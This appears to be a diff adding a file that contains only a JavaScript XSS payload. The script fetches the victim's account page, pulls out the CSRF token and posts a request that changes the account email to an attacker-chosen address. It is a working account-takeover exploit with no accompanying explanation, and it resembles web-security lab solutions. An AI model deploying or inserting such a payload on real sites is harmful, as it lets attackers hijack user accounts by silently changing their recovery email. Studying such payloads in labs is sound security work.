@@ -1,0 +1,21 @@
+<script>
+fetch('/my-account')
+    .then(response => response.text())
+    .then(html => {
+        var parser = new DOMParser();
+        var doc = parser.parseFromString(html, 'text/html');
+
+        var csrf = doc.getElementsByName('csrf')[0].value;
+
+        fetch('/my-account/change-email', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: new URLSearchParams({
+                email: 'leo@example.com',
+                csrf: csrf
+            })
+        });
+    });
+</script>
